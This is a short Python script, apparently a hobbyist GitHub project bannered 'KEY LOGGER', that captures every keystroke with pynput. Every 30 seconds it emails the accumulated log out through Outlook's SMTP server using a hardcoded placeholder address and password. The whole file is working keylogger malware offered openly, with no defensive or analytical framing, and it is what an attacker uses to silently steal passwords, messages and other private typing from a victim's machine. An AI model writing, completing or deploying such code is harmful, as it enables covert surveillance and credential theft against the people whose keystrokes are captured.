import pynput.keyboard
import  smtplib
import threading
""" 
  _  __________     __  _      ____   _____  _____ ______ _____  
 | |/ /  ____\ \   / / | |    / __ \ / ____|/ ____|  ____|  __ \ 
 | ' /| |__   \ \_/ /  | |   | |  | | |  __| |  __| |__  | |__) |
 |  < |  __|   \   /   | |   | |  | | | |_ | | |_ |  __| |  _  / 
 | . \| |____   | |    | |___| |__| | |__| | |__| | |____| | \ \ 
 |_|\_\______|  |_|    |______\____/ \_____|\_____|______|_|  \_\
                  @AZATDİCLE
            https://github.com/azatdicle
"""
log=""
def callback_function(Key):
    try:
        global log
        log=log+str(Key.char)
    except AttributeError:
        if Key==Key.space:
            log=log+" "
        else:
            log=log+str(Key)
    except:
        pass
    print(log)

def mail_Sender(mail,password,subject,body):
    email_server=smtplib.SMTP("smtp-mail.outlook.com",587)
    email_server.starttls()
    email_server.login(mail,password)
    message = f"Subject: {subject}\n\n{body}"
    subject = "Test Email"
    body = str(log)
    email_server.sendmail(mail,mail,message)
    email_server.quit()

keylogger_listener=pynput.keyboard.Listener(on_press=callback_function)

def threading_func():
    global log
    mail_Sender("user@outlook.com","password","Test",log.encode("utf-8"))# <========================  mail and password
    log=""
    timer_object=threading.Timer(30,threading_func)#Hangi işi yapayım kaç saniyede yapıyım
    timer_object.start()

with keylogger_listener:
    threading_func()
    keylogger_listener.join()
